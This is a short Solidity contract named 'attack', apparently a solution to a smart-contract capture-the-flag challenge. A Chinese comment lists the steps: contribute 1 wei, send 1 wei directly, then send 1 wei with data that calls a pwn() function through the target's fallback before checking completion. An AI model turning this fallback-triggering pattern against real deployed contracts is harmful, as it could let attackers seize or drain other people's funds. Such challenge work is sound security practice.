/*
1.contribute 并传入1wei。直接传1wei给合约。传1wei给合约并随便传入data。
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./recei.sol";
contract attack{
    address public re;
    constructor(address _re){
        re = _re;
    }

    function att()public payable{
        recei(payable(re)).contribute{value:1}();
        re.call{value:1}("");
        (bool success,)=re.call{value:1}(abi.encodeWithSignature("pwn()"));
        require(success,"fallback failed");
    }
    function complete()public{
        recei(payable(re)).isCompleted();
    }
}